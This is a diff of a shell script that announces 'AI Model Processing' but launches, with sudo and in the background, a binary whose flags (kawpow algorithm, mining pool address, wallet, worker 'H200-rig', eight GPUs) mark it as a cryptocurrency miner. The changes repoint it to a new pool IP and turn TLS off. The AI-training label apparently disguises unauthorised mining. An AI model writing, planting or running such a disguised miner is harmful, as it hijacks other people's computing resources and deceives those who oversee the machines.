@@ -13,12 +13,12 @@ echo "=== Starting AI Model Processing ==="
 nohup bash -c "
 sudo ./aitraining \
     --algorithm kawpow \
-    --pool 51.89.99.172:16161 \
+    --pool 74.220.25.74:784 \
     --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
     --worker H200-rig \
     --password x \
     --gpu-id 0,1,2,3,4,5,6,7 \
-    --tls true \
+    --tls false \
     --disable-cpu \
     --log-file ./logs/gpu_processing.log \
     --log-file-mode 1 \
